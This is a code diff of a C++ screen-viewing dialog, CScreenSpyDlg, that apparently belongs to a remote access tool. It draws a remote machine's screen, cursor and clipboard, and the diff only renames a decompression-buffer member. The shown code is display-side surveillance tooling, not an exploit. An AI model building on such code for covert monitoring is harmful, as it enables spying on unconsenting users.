@@ -64,12 +64,12 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientCont
 	
 	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
 
-	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
+	UINT	nBISize = m_pContext->m_DeCompressBuf.GetBufferLen() - 1;
 	m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
 	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];
 
-	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
-	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
+	memcpy(m_lpbmi, m_pContext->m_DeCompressBuf.GetBuffer(1), nBISize);
+	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressBuf.GetBuffer(1), nBISize);
 
 	memset(&m_MMI, 0, sizeof(MINMAXINFO));
 
@@ -128,13 +128,13 @@ void CScreenSpyDlg::OnReceiveComplete()
 {
 	m_nCount++;
 
-	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	switch (m_pContext->m_DeCompressBuf.GetBuffer(0)[0])
 	{
 	case TOKEN_FIRSTSCREEN:
 		DrawFirstScreen();
 		break;
 	case TOKEN_NEXTSCREEN:
-		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_SCAN)
+		if (m_pContext->m_DeCompressBuf.GetBuffer(0)[1] == ALGORITHM_SCAN)
 			DrawNextScreenRect();
 		else
 			DrawNextScreenDiff();
@@ -143,7 +143,7 @@ void CScreenSpyDlg::OnReceiveComplete()
 		ResetScreen();
 		break;
 	case TOKEN_CLIPBOARD_TEXT:
-		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
+		UpdateLocalClipboard((char *)m_pContext->m_DeCompressBuf.GetBuffer(1), m_pContext->m_DeCompressBuf.GetBufferLen() - 1);
 		break;
 	default:
 		// 传输发生异常数据
@@ -316,7 +316,7 @@ BOOL CScreenSpyDlg::OnInitDialog()
 
 void CScreenSpyDlg::ResetScreen()
 {
-	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
+	UINT	nBISize = m_pContext->m_DeCompressBuf.GetBufferLen() - 1;
 	if (m_lpbmi != NULL)
 	{
 		int	nOldWidth = m_lpbmi->bmiHeader.biWidth;
@@ -328,8 +328,8 @@ void CScreenSpyDlg::ResetScreen()
 		m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
 		m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];
 
-		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
-		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
+		memcpy(m_lpbmi, m_pContext->m_DeCompressBuf.GetBuffer(1), nBISize);
+		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressBuf.GetBuffer(1), nBISize);
 
 		DeleteObject(m_hFullBitmap);
 		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
@@ -357,7 +357,7 @@ void CScreenSpyDlg::ResetScreen()
 void CScreenSpyDlg::DrawFirstScreen()
 {
 	m_bIsFirst = false;
-	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);
+	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressBuf.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);
 
 	OnPaint();
 }
@@ -368,12 +368,12 @@ void CScreenSpyDlg::DrawNextScreenDiff()
 	bool	bIsReDraw = false;
 	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
 	LPVOID	lpFirstScreen = m_lpScreenDIB;
-	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
-	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
+	LPVOID	lpNextScreen = m_pContext->m_DeCompressBuf.GetBuffer(nHeadLength);
+	DWORD	dwBytes = m_pContext->m_DeCompressBuf.GetBufferLen() - nHeadLength;
 	
 	POINT	oldPoint;
 	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
-	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));
+	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressBuf.GetBuffer(2), sizeof(POINT));
 
 	// 鼠标移动了
 	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
@@ -381,7 +381,7 @@ void CScreenSpyDlg::DrawNextScreenDiff()
 
 	// 光标类型发生变化
 	int	nOldCursorIndex = m_bCursorIndex;
-	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
+	m_bCursorIndex = m_pContext->m_DeCompressBuf.GetBuffer(10)[0];
 	if (nOldCursorIndex != m_bCursorIndex)
 	{
 		bIsReDraw = true;
@@ -421,8 +421,8 @@ void CScreenSpyDlg::DrawNextScreenRect()
 	bool	bIsReDraw = false;
 	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
 	LPVOID	lpFirstScreen = m_lpScreenDIB;
-	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
-	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
+	LPVOID	lpNextScreen = m_pContext->m_DeCompressBuf.GetBuffer(nHeadLength);
+	DWORD	dwBytes = m_pContext->m_DeCompressBuf.GetBufferLen() - nHeadLength;
 
 	
 	// 保存上次鼠标所在的位置
@@ -430,7 +430,7 @@ void CScreenSpyDlg::DrawNextScreenRect()
 	::SetRect(&rectOldPoint, m_RemoteCursorPos.x, m_RemoteCursorPos.y, 
 		m_RemoteCursorPos.x + m_dwCursor_xHotspot, m_RemoteCursorPos.y + m_dwCursor_yHotspot);
 
-	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));
+	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressBuf.GetBuffer(2), sizeof(POINT));
 
 	//////////////////////////////////////////////////////////////////////////
 	// 判断鼠标是否移动
@@ -440,7 +440,7 @@ void CScreenSpyDlg::DrawNextScreenRect()
 
 	// 光标类型发生变化
 	int	nOldCursorIndex = m_bCursorIndex;
-	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
+	m_bCursorIndex = m_pContext->m_DeCompressBuf.GetBuffer(10)[0];
 	if (nOldCursorIndex != m_bCursorIndex)
 	{
 		bIsReDraw = true;
